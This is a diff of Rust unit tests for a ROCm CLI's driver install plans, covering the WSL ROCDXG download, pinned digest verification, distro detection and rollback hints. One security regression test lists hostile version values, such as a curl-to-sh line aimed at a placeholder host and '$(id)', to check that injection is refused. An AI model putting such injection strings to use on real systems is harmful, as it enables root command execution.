+        let plan = build_driver_install_plan(
+            &test_examine("linux", false),
+            os_release,
+            true,
+            PrivilegeEscalation::Sudo,
+        );
         let rendered = render_driver_install_plan(&plan, false, false);
 
         assert!(!plan.supported);
@@ -23515,7 +30873,13 @@ VERSION_ID="41"
 
     #[test]
     fn windows_install_driver_is_validate_only() {
-        let plan = build_driver_install_plan(&test_examine("windows", false), "", true);
+        let _env = ScopedTestEnv::with_amd_overrides_cleared();
+        let plan = build_driver_install_plan(
+            &test_examine("windows", false),
+            "",
+            true,
+            PrivilegeEscalation::Sudo,
+        );
         let rendered = render_driver_install_plan(&plan, false, true);
 
         assert!(!plan.supported);
@@ -23530,16 +30894,519 @@ VERSION_ID="41"
     }
 
     #[test]
-    fn wsl_install_driver_uses_rocdxg_guidance_without_dkms() {
-        let plan = build_driver_install_plan(&test_examine("linux", true), "", true);
+    fn wsl_install_driver_installs_rocdxg_without_dkms() {
+        // `dkms: true` is passed deliberately: WSL2 has no kernel module to
+        // build, so the flag must not pull in the bare-metal path.
+        //
+        // `build_driver_install_plan` resolves `${ROCM_CLI_AMDGPU_VERSION:-...}`
+        // from process env before it reaches the WSL branch, and the WSL branch
+        // then reads the three ROCDXG vars — an exported
+        // `ROCM_CLI_ROCDXG_VERSION` would steer this plan into a refusal and
+        // fail the `plan.supported` assertion below. So this reader takes the
+        // guard that clears both sets.
+        let _env = scoped_rocdxg_env();
+        let plan = build_driver_install_plan(
+            &test_examine("linux", true),
+            "",
+            true,
+            PrivilegeEscalation::Sudo,
+        );
         let rendered = render_driver_install_plan(&plan, false, false);
 
-        assert!(!plan.supported);
+        assert!(plan.supported);
+        assert!(plan.mutating);
         assert_eq!(plan.policy, "wsl_rocdxg");
-        assert!(rendered.contains("approval: not required"));
-        assert!(rendered.contains("execution_commands: <none>"));
-        assert!(rendered.contains("scripts/wsl_setup_rocdxg.sh"));
         assert!(!rendered.contains("amdgpu-dkms"));
+        // The whole point of the bug: the plan must be runnable, and must not
+        // send the user to a file that only exists in a git checkout.
+        assert!(!rendered.contains("execution_commands: <none>"));
+        assert!(!rendered.contains("scripts/"));
+        assert!(rendered.contains("approval: required"));
+    }
+
+    #[test]
+    fn wsl_rocdxg_plan_installs_the_library_and_publishes_it() {
+        // Asserts on the default plan, so it has to take the same guard as the
+        // mutating tests in this binary: a concurrent test exporting
+        // `ROCM_CLI_ROCDXG_VERSION` would otherwise steer this one's plan.
+        let _env = scoped_rocdxg_env();
+        let plan = wsl_rocdxg_driver_plan(PrivilegeEscalation::Sudo);
+        let commands = plan.execution_commands().join("\n");
+
+        // Fetches the release artifact, installs it, and makes the linker see
+        // it. Any one of these missing leaves `wsl_rocdxg_ready` unreachable.
+        assert!(commands.contains("https://github.com/ROCm/librocdxg/releases/download/"));
+        assert!(commands.contains("rocdxg-roct_"));
+        assert!(commands.contains("sudo apt-get install -y '/tmp/rocdxg-roct_"));
+        assert!(commands.contains("sudo ldconfig"));
+
+        // And in that order. `ldconfig` refreshes the cache from what is on
+        // disk now, so running it before `apt-get install` has unpacked
+        // `librocdxg.so` scans a directory that does not contain it yet and
+        // publishes nothing — leaving the plan reporting success while the
+        // `ldconfig -p` verification below is the only thing that would notice.
+        // Both steps are still present under that swap, so every `contains`
+        // assertion in this file stays green; only a position comparison
+        // catches it.
+        let steps = plan.execution_commands();
+        let install = steps
+            .iter()
+            .position(|c| c.contains("apt-get install -y '/tmp/"))
+            .expect("plan installs the package");
+        let publish = steps
+            .iter()
+            .position(|c| c.trim_end().ends_with("ldconfig"))
+            .expect("plan publishes the library");
+        assert!(
+            install < publish,
+            "ldconfig must run after the package is installed:\n{}",
+            steps.join("\n")
+        );
+
+        // Verification asserts the two things `examine` keys `wsl_rocdxg_ready`
+        // on, so a silently partial install cannot report success.
+        let verify = plan
+            .commands
+            .iter()
+            .filter(|c| c.phase == DriverCommandPhase::Verify)
+            .map(|c| c.command.clone())
+            .collect::<Vec<_>>()
+            .join("\n");
+        assert!(verify.contains("/opt/rocm/lib/librocdxg.so"));
+        assert!(verify.contains("ldconfig -p"));
+    }
+
+    #[test]
+    fn wsl_rocdxg_plan_guards_the_gpu_plumbing_before_any_mutating_command() {
+        // /dev/dxg and dxcore come from the Windows side. If they are missing,
+        // installing the bridge library accomplishes nothing, so the plan must
+        // stop rather than report a successful install of something inert.
+        let _env = scoped_rocdxg_env();
+        let plan = wsl_rocdxg_driver_plan(PrivilegeEscalation::Sudo);
+        let prepare = plan
+            .commands
+            .iter()
+            .filter(|c| c.phase == DriverCommandPhase::Prepare)
+            .map(|c| c.command.clone())
+            .collect::<Vec<_>>();
+        let joined = prepare.join("\n");
+        assert!(joined.contains("/dev/dxg"));
+        assert!(joined.contains("/usr/lib/wsl/lib/libdxcore.so"));
+        // Named explicitly, rather than surfacing as `sudo: command not found`
+        // from whichever privileged step happened to run first.
+        assert!(joined.contains("command -v sudo"));
+        // Both guards run before anything is fetched or installed.
+        let first_mutation = plan
+            .execution_commands()
+            .iter()
+            .position(|c| c.contains("apt-get") || c.contains("curl"))
+            .expect("plan installs something");
+        let last_guard = plan
+            .execution_commands()
+            .iter()
+            .rposition(|c| c.contains("is missing"))
+            .expect("plan guards the plumbing");
+        assert!(
+            last_guard < first_mutation,
+            "plumbing guards must precede the first mutating command"
+        );
+    }
+
+    /// Clear every input that steers the ROCDXG plan, so a value exported in
+    /// the developer's or runner's shell cannot decide the outcome of a test
+    /// that is asserting on the default.
+    ///
+    /// Builds on [`ScopedTestEnv::with_amd_overrides_cleared`] rather than
+    /// `new` because a WSL plan reached through `build_driver_install_plan`
+    /// resolves the bare-metal AMDGPU overrides before it dispatches to the WSL
+    /// branch: a caller needing one of these two guards needs both, and one
+    /// helper spares every test from picking the wrong half.
+    fn scoped_rocdxg_env() -> ScopedTestEnv {
+        let mut env = ScopedTestEnv::with_amd_overrides_cleared();
+        env.clear("ROCM_CLI_ROCDXG_VERSION");
+        env.clear(ROCDXG_SHA256_ENV);
+        env.clear(ROCDXG_ALLOW_UNVERIFIED_ENV);
+        env
+    }
+
+    #[test]
+    fn wsl_rocdxg_download_is_verified_against_a_pinned_digest_by_default() {
+        // The package is installed with `apt-get install`, which runs its
+        // maintainer scripts as root. With no digest, TLS to the release host
+        // is the only thing authenticating that download — weaker than the
+        // bare-metal path in this same file, which installs from a
+        // `signed-by=` pinned repository. So the default plan must verify.
+        let _env = scoped_rocdxg_env();
+        let commands = wsl_rocdxg_driver_plan(PrivilegeEscalation::Sudo).execution_commands();
+        let joined = commands.join("\n");
+
+        let pinned = ROCDXG_PINNED_DIGESTS
+            .iter()
+            .find_map(|(version, digest)| (*version == "1.2.2").then_some(*digest))
+            .expect("the default version is pinned");
+        assert!(joined.contains(pinned), "{joined}");
+        assert!(joined.contains("sha256sum -c -"), "{joined}");
+
+        // Not a conditional: an unset variable must not be able to turn
+        // verification off, which is what the previous `if [ -n ... ]` form
+        // did.
+        assert!(
+            !joined.contains("skipping checksum verification"),
+            "{joined}"
+        );
+        assert!(!joined.contains(ROCDXG_SHA256_ENV), "{joined}");
+
+        // Ordering is the whole point — a digest checked after the install has
+        // already run is decoration.
+        let check = commands
+            .iter()
+            .position(|c| c.contains("sha256sum -c -"))
+            .expect("plan verifies the download");
+        let install = commands
+            .iter()
+            .position(|c| c.contains("apt-get install -y '/tmp/"))
+            .expect("plan installs the package");
+        assert!(check < install, "digest must be checked before install");
+    }
+
+    #[test]
+    fn wsl_rocdxg_refuses_a_version_whose_digest_is_unknown() {
+        // An unpinned version is the case where silently falling back to "no
+        // verification" would be most dangerous, because it is reachable from
+        // a single environment variable.
+        let mut env = scoped_rocdxg_env();
+        env.set("ROCM_CLI_ROCDXG_VERSION", "9.9.9");
+
+        let plan = wsl_rocdxg_driver_plan(PrivilegeEscalation::Sudo);
+        assert!(!plan.supported);
+        assert!(!plan.mutating);
+        assert!(plan.commands.is_empty(), "a refusal must run nothing");
+        assert!(plan.reason.contains(ROCDXG_SHA256_ENV), "{}", plan.reason);
+        assert!(
+            plan.reason.contains(ROCDXG_ALLOW_UNVERIFIED_ENV),
+            "{}",
+            plan.reason
+        );
+    }
+
+    #[test]
+    fn wsl_rocdxg_accepts_a_supplied_digest_for_an_unpinned_version() {
+        // The escape hatch for a release newer than this build: supply the
+        // digest rather than disabling verification.
+        let mut env = scoped_rocdxg_env();
+        env.set("ROCM_CLI_ROCDXG_VERSION", "9.9.9");
+        let supplied = "a".repeat(64);
+        env.set(ROCDXG_SHA256_ENV, &supplied);
+
+        let plan = wsl_rocdxg_driver_plan(PrivilegeEscalation::Sudo);
+        assert!(plan.supported);
+        let joined = plan.execution_commands().join("\n");
+        assert!(joined.contains(&supplied), "{joined}");
+        assert!(joined.contains("sha256sum -c -"), "{joined}");
+    }
+
+    #[test]
+    fn wsl_rocdxg_rejects_a_malformed_supplied_digest() {
+        // A truncated or mistyped digest must not silently fall back to the
+        // pinned one, which would verify a different artifact than the user
+        // asked for and report success.
+        let mut env = scoped_rocdxg_env();
+        env.set(ROCDXG_SHA256_ENV, "not-a-digest");
+
+        let plan = wsl_rocdxg_driver_plan(PrivilegeEscalation::Sudo);
+        assert!(!plan.supported);
+        assert!(plan.commands.is_empty());
+        assert!(plan.reason.contains(ROCDXG_SHA256_ENV), "{}", plan.reason);
+    }
+
+    #[test]
+    fn wsl_rocdxg_unverified_install_takes_an_explicit_opt_out() {
+        // Installing unverified stays possible — it just has to be asked for,
+        // and the plan the user approves has to say so.
+        let mut env = scoped_rocdxg_env();
+        env.set("ROCM_CLI_ROCDXG_VERSION", "9.9.9");
+        env.set(ROCDXG_ALLOW_UNVERIFIED_ENV, "1");
+
+        let plan = wsl_rocdxg_driver_plan(PrivilegeEscalation::Sudo);
+        assert!(plan.supported);
+        let joined = plan.execution_commands().join("\n");
+        assert!(!joined.contains("sha256sum -c -"), "{joined}");
+        assert!(joined.contains("without verifying it"), "{joined}");
+    }
+
+    #[test]
+    fn wsl_rocdxg_opt_out_reads_negative_values_as_off() {
+        // The opt-out is a boolean, not a presence check. Reading "set to
+        // anything" as yes would turn digest verification off for a package
+        // installed as root on the strength of `=0` — the one value a reader
+        // writes when they mean the opposite.
+        for negative in ["0", "false", "no", "off", ""] {
+            let mut env = scoped_rocdxg_env();
+            env.set("ROCM_CLI_ROCDXG_VERSION", "9.9.9");
+            env.set(ROCDXG_ALLOW_UNVERIFIED_ENV, negative);
+
+            let plan = wsl_rocdxg_driver_plan(PrivilegeEscalation::Sudo);
+            assert!(
+                !plan.supported,
+                "{ROCDXG_ALLOW_UNVERIFIED_ENV}={negative:?} disabled verification"
+            );
+            assert!(
+                plan.commands.is_empty(),
+                "{ROCDXG_ALLOW_UNVERIFIED_ENV}={negative:?} built an unverified install"
+            );
+        }
+
+        // The affirmative spellings still work, so this is a narrowing of what
+        // counts as yes rather than a removal of the escape hatch.
+        for affirmative in ["1", "true", "yes", "on"] {
+            let mut env = scoped_rocdxg_env();
+            env.set("ROCM_CLI_ROCDXG_VERSION", "9.9.9");
+            env.set(ROCDXG_ALLOW_UNVERIFIED_ENV, affirmative);
+
+            let plan = wsl_rocdxg_driver_plan(PrivilegeEscalation::Sudo);
+            assert!(
+                plan.supported,
+                "{ROCDXG_ALLOW_UNVERIFIED_ENV}={affirmative:?} was not honoured"
+            );
+        }
+    }
+
+    #[test]
+    fn wsl_rocdxg_refuses_a_version_that_could_escape_the_shell() {
+        // `ROCM_CLI_ROCDXG_VERSION` is interpolated into commands executed via
+        // `sh -c` after `apt-get update` has primed the sudo credential cache,
+        // so a `;` in it would start a second, attacker-chosen command running
+        // as root. The plan must refuse rather than quote its way out.
+        for hostile in [
+            "1.2.0; curl http://example.invalid/x | sh",
+            "1.2.0 && id",
+            "$(id)",
+            "1.2.0`id`",
+            "../../etc/passwd",
+            "1.2.0\nid",
+            "1.2.0 ",
+        ] {
+            let mut env = scoped_rocdxg_env();
+            env.set("ROCM_CLI_ROCDXG_VERSION", hostile);
+            // An opt-out must not buy past the version check either.
+            env.set(ROCDXG_ALLOW_UNVERIFIED_ENV, "1");
+
+            let plan = wsl_rocdxg_driver_plan(PrivilegeEscalation::Sudo);
+            assert!(!plan.supported, "accepted hostile version {hostile:?}");
+            assert!(
+                plan.commands.is_empty(),
+                "built commands from hostile version {hostile:?}"
+            );
+            // The refused value is echoed back in the plan a human reads, so it
+            // must not be able to forge lines there. Every line the renderer
+            // emits after the header is indented, so an unindented one came
+            // from the value.
+            let rendered = render_driver_install_plan(&plan, false, false);
+            for line in rendered.lines().skip(1) {
+                assert!(
+                    line.starts_with("  "),
+                    "hostile version {hostile:?} forged plan line {line:?} in:\n{rendered}"
+                );
+            }
+        }
+    }
+
+    #[test]
+    fn wsl_rocdxg_plan_drops_sudo_when_already_root() {
+        // Same reason the bare-metal plans take an escalation: containers and
+        // minimal cloud images run as uid 0 with no `sudo` binary, where an
+        // unconditional prefix kills every command before any driver work.
+        let _env = scoped_rocdxg_env();
+        let plan = wsl_rocdxg_driver_plan(PrivilegeEscalation::AlreadyRoot);
+        let joined = plan.execution_commands().join("\n");
+        assert!(!joined.contains("sudo "), "{joined}");
+        assert!(joined.contains("apt-get install -y '/tmp/"), "{joined}");
+        // And it must not demand a binary it no longer uses.
+        assert!(!joined.contains("command -v sudo"), "{joined}");
+        assert!(
+            !plan
+                .preflight_checks
+                .iter()
+                .any(|check| check.contains("`sudo` command is available")),
+            "{:?}",
+            plan.preflight_checks
+        );
+    }
+
+    /// Runs the digest step the plan actually generates, rather than asserting
+    /// that it contains some substrings.
+    ///
+    /// The step this exercises is the trust anchor for a root install, and the
+    /// executable self-test that used to cover it was deleted along with
+    /// `scripts/wsl_setup_rocdxg.sh`. Substring assertions would let a quoting,
+    /// field-order or newline regression in the `printf | sha256sum -c -`
+    /// fragment ship green, so the generated command is pinned whole with
+    /// `assert_eq!` and then executed — with only the two values it embeds
+    /// redirected at a test payload, so the quoting, spacing and field order
+    /// under test are production's rather than a replica's.
+    ///
+    /// Field order in particular is invisible to a `starts_with`/`ends_with`
+    /// pair: `sha256sum -c -` reads `DIGEST  FILENAME`, so emitting the path
+    /// first breaks every real WSL install while still starting with
+    /// `printf '%s  %s\n' '` and ending with `' | sha256sum -c -`.
+    #[cfg(unix)]
+    #[test]
+    fn wsl_rocdxg_generated_digest_step_accepts_only_the_matching_file() {
+        use std::process::Command;
+
+        let _env = scoped_rocdxg_env();
+        let plan = wsl_rocdxg_driver_plan(PrivilegeEscalation::Sudo);
+        let version = plan.repo_version.clone();
+        let pinned = ROCDXG_PINNED_DIGESTS
+            .iter()
+            .find_map(|(pinned_version, digest)| {
+                (*pinned_version == version.as_str()).then_some(*digest)
+            })
+            .expect("the default version is pinned");
+        let deb_path = format!("/tmp/rocdxg-roct_{version}_amd64.deb");
+        let generated = plan
+            .execution_commands()
+            .into_iter()
+            .find(|c| c.contains("sha256sum -c -"))
+            .expect("plan verifies the download");
+
+        // Whole-string, not `contains`: the digest has to come first and the
+        // two fields have to be separated by exactly the two spaces
+        // `sha256sum -c -` expects.
+        assert_eq!(
+            generated,
+            format!("printf '%s  %s\\n' '{pinned}' '{deb_path}' | sha256sum -c -")
+        );
+
+        let (root, _paths) = test_paths("wsl-rocdxg-digest");
+        fs::create_dir_all(&root).expect("test root");
+        let payload = root.join(format!("rocdxg-roct_{version}_amd64.deb"));
+        fs::write(&payload, b"pretend this is a .deb\n").expect("write payload");
+
+        let digest_of = |path: &Path| -> String {
+            let out = Command::new("sha256sum")
+                .arg(path)
+                .output()
+                .expect("sha256sum runs");
+            assert!(out.status.success());
+            String::from_utf8(out.stdout)
+                .expect("utf8")
+                .split_whitespace()
+                .next()
+                .expect("digest field")
+                .to_owned()
+        };
+        let good = digest_of(&payload);
+
+        // The command under test is the generated one; the only edits are the
+        // digest being checked and the path being checked, so a regression in
+        // how the fragment is built reaches `sh` here instead of being masked
+        // by a replica built to the test's own idea of the right shape.
+        let step = |digest: &str| -> bool {
+            let command = generated
+                .replace(pinned, digest)
+                .replace(&deb_path, &payload.display().to_string());
+            Command::new("sh")
+                .arg("-c")
+                .arg(&command)
+                .output()
+                .expect("sh runs")
+                .status
+                .success()
+        };
+
+        assert!(step(&good), "the matching digest must pass");
+        assert!(
+            !step(&"0".repeat(64)),
+            "a mismatched digest must fail the step"
+        );
+        assert!(!step("deadbeef"), "a malformed digest must fail the step");
+        assert!(!step(""), "an empty digest must fail the step");
+
+        let _ = fs::remove_dir_all(&root);
+    }
+
+    #[test]
+    fn wsl_rocdxg_install_does_not_ask_for_a_reboot() {
+        // ROCDXG is userspace: `ldconfig` publishes it in this boot. The
+        // bare-metal DKMS path is the one that needs a reboot.
+        let _env = scoped_rocdxg_env();
+        let wsl = wsl_rocdxg_driver_plan(PrivilegeEscalation::Sudo);
+        assert!(!wsl.reboot_required);
+        let rendered = render_driver_install_plan(&wsl, false, false);
+        // Anchor on the install step first: a refusal plan also reports
+        // `reboot_required: false`, renders `post_install_checks:` from its
+        // non-empty `checks`, and contains no `post_reboot` — so the three
+        // assertions below hold against a plan that installs nothing at all.
+        // Only a real install plan carries this command.
+        assert!(
+            rendered.contains("apt-get install -y '/tmp/"),
+            "expected a real install plan, got:\n{rendered}"
+        );
+        assert!(rendered.contains("post_install_checks:"));
+        assert!(!rendered.contains("post_reboot"));
+
+        let bare_metal = build_driver_install_plan(
+            &test_examine("linux", false),
+            "ID=ubuntu\nVERSION_ID=\"24.04\"\nVERSION_CODENAME=noble\n",
+            true,
+            PrivilegeEscalation::Sudo,
+        );
+        assert!(bare_metal.reboot_required);
+        assert!(render_driver_install_plan(&bare_metal, false, false).contains("post_reboot"));
+    }
+
+    #[test]
+    fn wsl_rocdxg_version_is_overridable_and_reaches_every_reference() {
+        // One resolved value drives the archive name, the release tag and the
+        // download path, so an override cannot leave a URL pointing at the
+        // default. The value is resolved at plan-build time rather than left as
+        // a `${VAR:-default}` template, so the plan the user reviews names the
+        // build the install will actually fetch.
+        let mut env = scoped_rocdxg_env();
+
+        let plan = wsl_rocdxg_driver_plan(PrivilegeEscalation::Sudo);
+        assert_eq!(plan.repo_version, "1.2.2");
+        let commands = plan.execution_commands().join("\n");
+        // The version is resolved here, not deferred to the shell: the plan the
+        // user approves has to name the build the install will actually fetch.
+        // No `${...}` expansion survives into the commands at all — the digest
+        // is resolved at plan-build time too, which
+        // `wsl_rocdxg_download_is_verified_against_a_pinned_digest_by_default`
+        // asserts by name.
+        assert!(
+            !commands.contains("ROCM_CLI_ROCDXG_VERSION"),
+            "version must be resolved at plan-build time, not left as a shell template:\n{commands}"
+        );
+        let occurrences = commands.matches("1.2.2").count();
+        assert!(
+            occurrences >= 3,
+            "version should drive the deb name, the tag and the path; saw {occurrences}"
+        );
+
+        // An override has to reach every one of those references, including the
+        // release URL — the bug this guards is a URL left on the default. The
+        // digest comes along because an unpinned version is refused outright;
+        // see `wsl_rocdxg_refuses_a_version_whose_digest_is_unknown`.
+        env.set("ROCM_CLI_ROCDXG_VERSION", "9.9.9");
+        env.set(ROCDXG_SHA256_ENV, &"b".repeat(64));
+        let overridden = wsl_rocdxg_driver_plan(PrivilegeEscalation::Sudo);
+        assert_eq!(overridden.repo_version, "9.9.9");
+        let commands = overridden.execution_commands().join("\n");
+        assert!(
+            commands.contains("rocdxg-roct_9.9.9_amd64.deb"),
+            "{commands}"
+        );
+        assert!(
+            commands.contains(
+                "https://github.com/ROCm/librocdxg/releases/download/v9.9.9/rocdxg-roct_9.9.9_amd64.deb"
+            ),
+            "{commands}"
+        );
+        assert!(
+            !commands.contains("1.2.2"),
+            "override left a reference on the default version:\n{commands}"
+        );
     }
 
     // EAI-7406: distro selection must honor `/etc/os-release` `ID_LIKE`, so that
@@ -23549,6 +31416,7 @@ VERSION_ID="41"
 
     #[test]
     fn driver_plan_ubuntu_derivative_via_id_like_matches_ubuntu_plan() {
+        let _env = ScopedTestEnv::with_amd_overrides_cleared();
         // Pop!_OS reports its own ID but reuses Ubuntu's version + repositories.
         let os_release = r#"
 ID=pop
@@ -23556,7 +31424,12 @@ VERSION_ID="22.04"
 VERSION_CODENAME=jammy
 ID_LIKE="ubuntu debian"
 "#;
-        let plan = build_driver_install_plan(&test_examine("linux", false), os_release, true);
+        let plan = build_driver_install_plan(
+            &test_examine("linux", false),
+            os_release,
+            true,
+            PrivilegeEscalation::Sudo,
+        );
         let rendered = render_driver_install_plan(&plan, false, false);
 
         assert!(plan.supported);
@@ -23564,54 +31437,58 @@ ID_LIKE="ubuntu debian"
         assert_eq!(plan.policy, "linux_official_amd_dkms_wrapper");
         // Ubuntu-family derivatives ship the Ubuntu kernel, so linux-modules-extra applies.
         assert!(rendered.contains("linux-modules-extra-$(uname -r)"));
-        assert!(rendered.contains(
-            "https://repo.radeon.com/graphics/${ROCM_CLI_AMDGPU_VERSION:-7.2.4}/ubuntu jammy main"
-        ));
+        assert!(rendered.contains("https://repo.radeon.com/graphics/7.2.4/ubuntu jammy main"));
         assert!(rendered.contains("Execute: sudo apt-get install -y amdgpu-dkms"));
     }
 
     #[test]
     fn driver_plan_debian_derivative_via_id_like_matches_debian_plan() {
+        let _env = ScopedTestEnv::with_amd_overrides_cleared();
         // A Debian derivative (e.g. LMDE) that shares Debian's version scheme.
         let os_release = r#"
 ID=lmde
 VERSION_ID="12"
 ID_LIKE=debian
 "#;
-        let plan = build_driver_install_plan(&test_examine("linux", false), os_release, true);
+        let plan = build_driver_install_plan(
+            &test_examine("linux", false),
+            os_release,
+            true,
+            PrivilegeEscalation::Sudo,
+        );
         let rendered = render_driver_install_plan(&plan, false, false);
 
         assert!(plan.supported);
         // Debian-family maps to the Ubuntu jammy repo and omits linux-modules-extra.
-        assert!(rendered.contains(
-            "https://repo.radeon.com/graphics/${ROCM_CLI_AMDGPU_VERSION:-7.2.4}/ubuntu jammy main"
-        ));
+        assert!(rendered.contains("https://repo.radeon.com/graphics/7.2.4/ubuntu jammy main"));
         assert!(!rendered.contains("linux-modules-extra-$(uname -r)"));
         assert!(rendered.contains("amdgpu-dkms"));
     }
 
     #[test]
     fn driver_plan_almalinux_via_id_like_uses_el_9_flow() {
+        let _env = ScopedTestEnv::with_amd_overrides_cleared();
         // AlmaLinux is a RHEL rebuild: standard kernel, served from the el/ path.
         let os_release = r#"
 ID=almalinux
 VERSION_ID="9.6"
 ID_LIKE="rhel centos fedora"
 "#;
-        let plan = build_driver_install_plan(&test_examine("linux", false), os_release, true);
+        let plan = build_driver_install_plan(
+            &test_examine("linux", false),
+            os_release,
+            true,
+            PrivilegeEscalation::Sudo,
+        );
         let rendered = render_driver_install_plan(&plan, false, false);
 
         assert!(plan.supported);
         assert!(plan.mutating);
         assert_eq!(plan.policy, "linux_official_amd_dkms_wrapper");
         // EL rebuilds use the vendor-neutral el/ repo path, not rhel/.
-        assert!(
-            rendered.contains(
-                "repo.radeon.com/amdgpu-install/${ROCM_CLI_AMDGPU_VERSION:-7.2.4}/el/9.6/"
-            )
-        );
+        assert!(rendered.contains("repo.radeon.com/amdgpu-install/7.2.4/el/9.6/"));
         assert!(!rendered.contains("/rhel/9.6/"));
-        assert!(rendered.contains("amdgpu-install-${ROCM_CLI_AMDGPU_VERSION:-7.2.4}.${ROCM_CLI_AMDGPU_PACKAGE_RELEASE:-70204}-1.el9.noarch.rpm"));
+        assert!(rendered.contains("amdgpu-install-7.2.4.70204-1.el9.noarch.rpm"));
         // el9 uses the version-aware standard-kernel prepare commands.
         assert!(rendered.contains("kernel-devel-matched-$(uname -r)"));
         assert!(rendered.contains("Execute: sudo dnf install -y amdgpu-dkms"));
@@ -23619,20 +31496,23 @@ ID_LIKE="rhel centos fedora"
 
     #[test]
     fn driver_plan_almalinux_8_via_id_like_uses_el_major_path() {
+        let _env = ScopedTestEnv::with_amd_overrides_cleared();
         let os_release = r#"
 ID=almalinux
 VERSION_ID="8.10"
 ID_LIKE="rhel centos fedora"
 "#;
-        let plan = build_driver_install_plan(&test_examine("linux", false), os_release, true);
+        let plan = build_driver_install_plan(
+            &test_examine("linux", false),
+            os_release,
+            true,
+            PrivilegeEscalation::Sudo,
+        );
         let rendered = render_driver_install_plan(&plan, false, false);
 
         assert!(plan.supported);
         // EL 8 is served from the major-version path (el/8), matching AMD docs.
-        assert!(
-            rendered
-                .contains("repo.radeon.com/amdgpu-install/${ROCM_CLI_AMDGPU_VERSION:-7.2.4}/el/8/")
-        );
+        assert!(rendered.contains("repo.radeon.com/amdgpu-install/7.2.4/el/8/"));
         assert!(rendered.contains("-1.el8.noarch.rpm"));
         // el8 has no kernel-devel-matched package.
         assert!(!rendered.contains("kernel-devel-matched"));
@@ -23641,6 +31521,7 @@ ID_LIKE="rhel centos fedora"
 
     #[test]
     fn driver_plan_id_like_with_unsupported_version_stays_unsupported() {
+        let _env = ScopedTestEnv::with_amd_overrides_cleared();
         // A Debian-family derivative whose VERSION_ID does not align with any
         // AMD-documented Debian version must not fabricate a plan.
         let os_release = r#"
@@ -23648,7 +31529,12 @@ ID=lmde
 VERSION_ID="6"
 ID_LIKE=debian
 "#;
-        let plan = build_driver_install_plan(&test_examine("linux", false), os_release, true);
+        let plan = build_driver_install_plan(
+            &test_examine("linux", false),
+            os_release,
+            true,
+            PrivilegeEscalation::Sudo,
+        );
         let rendered = render_driver_install_plan(&plan, false, false);
 
         assert!(!plan.supported);
@@ -23659,24 +31545,29 @@ ID_LIKE=debian
 
     #[test]
     fn driver_plan_exact_id_takes_precedence_over_id_like() {
+        let _env = ScopedTestEnv::with_amd_overrides_cleared();
         // An exact RHEL match must keep the rhel/ path even though ID_LIKE=fedora.
         let os_release = r#"
 ID=rhel
 VERSION_ID="9.7"
 ID_LIKE=fedora
 "#;
-        let plan = build_driver_install_plan(&test_examine("linux", false), os_release, true);
+        let plan = build_driver_install_plan(
+            &test_examine("linux", false),
+            os_release,
+            true,
+            PrivilegeEscalation::Sudo,
+        );
         let rendered = render_driver_install_plan(&plan, false, false);
 
         assert!(plan.supported);
-        assert!(rendered.contains(
-            "repo.radeon.com/amdgpu-install/${ROCM_CLI_AMDGPU_VERSION:-7.2.4}/rhel/9.7/"
-        ));
+        assert!(rendered.contains("repo.radeon.com/amdgpu-install/7.2.4/rhel/9.7/"));
         assert!(!rendered.contains("/el/9.7/"));
     }
 
     #[test]
     fn driver_plan_oracle_linux_off_arm_version_stays_unsupported() {
+        let _env = ScopedTestEnv::with_amd_overrides_cleared();
         // Oracle Linux reports `ID_LIKE=fedora` (not rhel) and boots UEK. An OL
         // version outside the exact `ol` arm must NOT be captured by the EL
         // fallback, which would emit non-UEK kernel commands that cannot install.
@@ -23685,7 +31576,12 @@ ID=ol
 VERSION_ID="9.6"
 ID_LIKE=fedora
 "#;
-        let plan = build_driver_install_plan(&test_examine("linux", false), os_release, true);
+        let plan = build_driver_install_plan(
+            &test_examine("linux", false),
+            os_release,
+            true,
+            PrivilegeEscalation::Sudo,
+        );
         let rendered = render_driver_install_plan(&plan, false, false);
 
         assert!(!plan.supported);
@@ -23697,6 +31593,7 @@ ID_LIKE=fedora
 
     #[test]
     fn driver_plan_opensuse_leap_stays_unsupported() {
+        let _env = ScopedTestEnv::with_amd_overrides_cleared();
         // openSUSE Leap shares SLES's version scheme but has no SUSEConnect/SCC
         // entitlement, so it must not be matched to the SLES plan.
         let os_release = r#"
@@ -23704,7 +31601,12 @@ ID=opensuse-leap
 VERSION_ID="15.7"
 ID_LIKE="suse opensuse"
 "#;
-        let plan = build_driver_install_plan(&test_examine("linux", false), os_release, true);
+        let plan = build_driver_install_plan(
+            &test_examine("linux", false),
+            os_release,
+            true,
+            PrivilegeEscalation::Sudo,
+        );
         let rendered = render_driver_install_plan(&plan, false, false);
 
         assert!(!plan.supported);
@@ -23983,11 +31885,62 @@ ID_LIKE="suse opensuse"
         assert!(success.contains(&manifest.install_root.display().to_string()));
         assert!(!success.contains("config:"));
         assert!(!success.contains("marker:"));
+        assert!(
+            !success.contains("rocm runtimes rollback"),
+            "the first install has no previous runtime, so rollback would hard-error; \
+             must not hint at a command that immediately fails:\n{success}"
+        );
 
         let mut examine = String::new();
         append_examine_runtime_state(&mut examine, &rebased_paths, &config)?;
         assert!(examine.contains("active_runtime_status: ready"));
         assert!(examine.contains("setup_runtime_root:"));
+
+        let _ = fs::remove_dir_all(root);
+        Ok(())
+    }
+
+    /// A second `install sdk` switches the active runtime the same way
+    /// `runtimes activate` does, and `activate_runtime` records the previous
+    /// runtime either way — so this path must surface the same rollback hint
+    /// `runtimes activate` and `update --apply --activate` already do, not
+    /// silently drop the recovery advice because it went through the install
+    /// finalization path instead.
+    #[test]
+    fn sdk_install_finalization_hints_rollback_after_a_second_install() -> Result<()> {
+        let (root, paths) = test_paths("sdk-install-finalization-second-install");
+        write_test_pip_runtime(
+            &paths,
+            "release-pip-gfx120x-all-first",
+            "therock-release:gfx120X-all",
+            "7.12.0",
+            10,
+        )?;
+        let first = finalize_successful_sdk_install(&paths)?
+            .context("first sdk install finalization should select the installed runtime")?;
+        assert_eq!(first.previous_runtime_key, None);
+
+        let second_manifest = write_test_pip_runtime(
+            &paths,
+            "release-pip-gfx120x-all-second",
+            "therock-release:gfx120X-all",
+            "7.13.0",
+            20,
+        )?;
+        let second = finalize_successful_sdk_install(&paths)?
+            .context("second sdk install finalization should select the newest runtime")?;
+        assert_eq!(second.runtime_key, second_manifest.runtime_key);
+        assert_eq!(
+            second.previous_runtime_key.as_deref(),
+            Some("release-pip-gfx120x-all-first")
+        );
+
+        let success = render_sdk_install_success(&second);
+        assert!(
+            success.contains("next step: if this causes problems, run `rocm runtimes rollback`"),
+            "a previous runtime was recorded, so the install summary should hint at rollback \
+             as a recovery path, got:\n{success}"
+        );
 
         let _ = fs::remove_dir_all(root);
         Ok(())
